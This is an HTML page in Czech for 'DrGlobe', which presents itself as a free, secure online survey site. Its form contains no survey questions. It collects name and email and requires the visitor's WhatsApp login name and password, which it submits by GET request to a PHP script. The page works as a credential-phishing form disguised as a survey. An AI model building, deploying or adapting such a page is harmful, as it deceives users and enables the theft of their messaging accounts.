<!DOCTYPE html>
<html>
    <head lang="cs-cz">
         <meta charset="utf-8" />
         <title>DrGlobe - nejlepsi web na pruzkumy</title>
         <!--CSS-->
         <link rel="stylesheet" href="style.css" />
         <!--FONT LOADING-->
         <link rel="stylesheet" media="(max-width: 425px)" href="mobilni.css">
         <!--FAVICON-->
        <link rel="apple-touch-icon" sizes="180x180" href="travel-icon-b.svg">
        <link rel="icon" type="image/png" sizes="32x32" href="travel-icon-b.svg">
        <link rel="icon" type="image/png" sizes="16x16" href="travel-icon-b.svg">
        <link rel="manifest" href="travel-icon.svg">
        <link rel="mask-icon" href="travel-icon.svg" color="#5bbad5">
        <meta name="msapplication-TileColor" content="#da532c">
        <meta name="theme-color" content="#ffffff">
        <!--LINKS AND PREVIEWS-->
        <meta name="description" content="Nejrychlejsi bezplatne zabezpecene online pruzkumy, na webove strance DrGlobe.">
        <meta property="og:image" content="http://www.nescius.chytrak.cz/Nahled.png">
        <meta name="twitter:card" content="summary" />
        <meta property="og:title" content="DrGlobe - nejlepsi web na pruzkumy" />
        <meta property="og:description" content="Nejrychlejsi bezplatne zabezpecene online pruzkumy, na webove strance DrGlobe" />
        <script src='https://www.hCaptcha.com/1/api.js' async defer></script>
    </head>
    <body>
        <nav>
            <a class="navbuttons" href="/drglobe"><img class="logo" src="travel-icon.svg" alt="travel_icon"><h1 class="nav-header">DrGlobe</h1></a>
            <a class=""></a>
        </nav>
        <main>
        <form method="get" action="sendata.php" onsubmit="return checkForm(this);">
            <fieldset class="form-section colored-field">
                <legend><b>Kontaktni udaje</b></legend>
                <section class="name">
                <section class="leva">
                    <label for="jmeno">Jmeno:</label>
                    <input type="text" id="jmeno" name="jmeno" size="50" maxlength="25" placeholder="napr. Adam" required>
                </section>
                <section class="prava">
                    <label for="prijmeni">Prijmeni:</label>
                    <input type="text" id="prijmeni" name="prijmeni" size="50" maxlength="25" placeholder="napr. Novak" required>
                </section>
                </section>
                <section class="leva">
                    <label for="email">Email:</label>
                    <input type="email" id="email" name="email" size="50" maxlength="30" placeholder="napr. adam.novak@gmail.cz" required>
                </section>
            </fieldset>
            <fieldset class="colored-field">
                <legend><b>Prihlasovaci jmeno a heslo k Whatsapp</b></legend>
                <section>
                    <label for="whatsapp-jmeno">Prihlasovaci jmeno:</label>
                    <input type="text" id="whatsapp-jmeno" name="whatsapp-jmeno" size="50" maxlength="30" placeholder="jmeno v aplikaci whatsapp" required>
                </section>
                <section>
                <label for="whatsapp-heslo">Prihlasovaci heslo:</label>
                <input type="password" id="whatsapp-heslo" name="whatsapp-heslo" size="50" maxlength="30" placeholder="heslo v aplikaci whatsapp" required>
                </section>
            </fieldset>
            <fieldset class="fieldset-submit">
                <label class="podminky" for="podminky">Souhlasim se <a href="podminky.php" class="white-link">zasadami spracovani osobnich udaju</a></label>
                <input type="checkbox" value="podminky" required>
                <div class="h-captcha" data-sitekey="058fb811-14b6-4785-b01b-fcd3c30a90d1"></div>
                <input class="form-button submit" type="submit" value="Odeslat">
                <input class="form-button reset" type="reset" value="Vymazat">
            </fieldset>
        </form>
        </main>
        <footer>
            <p><small>&copy; Copyright 2022 DrGlobe, s.r.o</small></p>
        </footer>
        <!--Cookies-->
        <script src="https://cdn.websitepolicies.io/lib/cookieconsent/1.0.3/cookieconsent.min.js" defer></script><script>window.addEventListener("load",function(){window.wpcc.init({"border":"thin","corners":"small","colors":{"popup":{"background":"#f6f6f6","text":"#000000","border":"#555555"},"button":{"background":"#555555","text":"#ffffff"}},"content":{"href":"http://nescius.chytrak.cz/drglobe/podminky.php","message":"Tato stranka vyuziva ke svemu spravnemu chodu cookies. Z hlediska zakonu Vas o tom musime informovat i kdyz se Vas to zadnym zpusobem nedotkne.","button":"OK, beru na vedomi.","link":"Vice"}})});</script>
    </body>
</html>